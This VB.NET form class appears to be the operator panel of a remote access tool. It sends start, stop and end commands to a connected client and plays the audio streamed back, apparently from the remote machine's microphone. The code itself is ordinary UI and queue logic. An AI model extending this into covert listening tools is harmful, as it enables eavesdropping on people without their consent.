Imports NAudio.Wave

Public Class Sound
    Public C As Client
    Public waveplayer As WasapiOut = New WasapiOut()
    Public bwp As BufferedWaveProvider = New BufferedWaveProvider(WaveFormat.CreateIeeeFloatWaveFormat(44100, 2))
    Private Sub Sound_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub


    Private Sub Sound_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            waveplayer.Stop()
            waveplayer?.Dispose()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try


        Dim B As Byte() = SB("ESound")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        If Button1.Text = "Start" Then

            Dim B As Byte() = SB("SSound")
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

            Button1.Text = "Stop"
        Else

            Dim B As Byte() = SB("CSound")
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

            Button1.Text = "Start"
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class